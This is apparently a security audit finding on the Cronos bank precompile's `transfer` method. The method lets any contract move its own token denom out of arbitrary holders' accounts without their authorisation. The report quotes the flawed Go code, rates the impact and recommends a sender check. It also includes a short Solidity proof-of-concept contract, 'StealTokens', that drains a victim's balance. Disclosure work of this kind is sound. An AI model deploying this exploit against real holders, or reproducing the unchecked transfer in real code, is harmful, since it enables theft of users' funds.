### Title
Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Holders' `evm/` Tokens Without Authorization - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` precompile's `transfer` method accepts a caller-controlled `sender` address and moves `evm/<callerAddress>` native bank tokens from that address to any recipient — with no check that the specified sender has authorized the transfer. Any EVM contract can drain `evm/<itsOwnAddress>` tokens from any holder.

### Finding Description

The `TransferMethodName` case in `BankContract.Run` unpacks three arguments from the call input: `sender`, `recipient`, and `amount`. The denom is derived from the calling contract's address (`EVMDenom(contract.Caller())`), but the `from` address used in `bankKeeper.SendCoins` is taken directly from the caller-supplied `sender` argument with no authorization check:

```go
// x/cronos/keeper/precompiles/bank.go  (lines 167–200)
case TransferMethodName:
    args, err := method.Inputs.Unpack(contract.Input[4:])
    ...
    sender    := args[0].(common.Address)   // ← fully attacker-controlled
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    ...
    from  := sdk.AccAddress(sender.Bytes())
    to    := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())    // "evm/<callerAddress>"
    amt   := sdk.NewCoin(denom, ...)
    ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))  // no auth
```

There is no assertion that `sender == contract.Caller()` (the EVM `msg.sender`), no allowance/approval lookup, and no other authorization gate. The only guard present is `checkBlockedAddr(to)`, which checks the recipient, not the sender. [1](#0-0) 

The `mint` method (same file, lines 113–156) correctly derives the denom from `contract.Caller()`, so the minting authority is scoped to the issuing contract. The `transfer` method inherits the same denom scoping but fails to scope the *spending* authority to the token holder. [2](#0-1) 

### Impact Explanation

**Critical — Unauthorized transfer of bank-module assets.**

A malicious EVM contract `M` can:
1. Mint `evm/M` tokens to a victim (e.g., as part of a DeFi interaction, reward distribution, or LP position).
2. At any later time, call `bank.transfer(victimAddress, attackerAddress, victimBalance)` — no signature, approval, or consent from the victim is required.
3. The bank module executes `SendCoins(victim, attacker, evm/M)` unconditionally.

All holders of any `evm/<contractAddress>` token are permanently at risk of having their entire balance stolen by the issuing contract at will. This is an unauthorized balance change for bank-module assets, matching the Critical impact tier.

### Likelihood Explanation

Any unprivileged user can deploy an EVM contract and call the bank precompile at address `0x0000...0064`. No admin key, governance vote, or validator compromise is required. The precompile is reachable from any EVM transaction. The attack is deterministic and requires no race condition or timing assumption.

### Recommendation

Add an authorization check in the `TransferMethodName` case that enforces the `sender` argument equals the immediate EVM caller (`contract.Caller()`):

```go
if sender != contract.Caller() {
    return nil, errors.New("bank transfer: sender must be the direct caller")
}
```

Alternatively, implement an EVM-level allowance mechanism (analogous to ERC-20 `approve`/`transferFrom`) so that a contract may transfer on behalf of a holder only after explicit on-chain approval.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract StealTokens {
    IBank constant BANK = IBank(address(0x64));

    // Step 1: issue evm/<address(this)> tokens to a victim
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<address(this)> balance — no victim signature needed
    function drain(address victim, address attacker, uint256 amount) external {
        BANK.transfer(victim, attacker, amount);  // succeeds unconditionally
    }
}
```

`drain()` calls `bank.transfer(victim, attacker, amount)`. The precompile sets `from = victim`, `denom = "evm/<StealTokens>"`, and executes `bankKeeper.SendCoins(victim, attacker, coins)` without any check that `victim` authorized the spend. The attacker receives the tokens. [3](#0-2)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
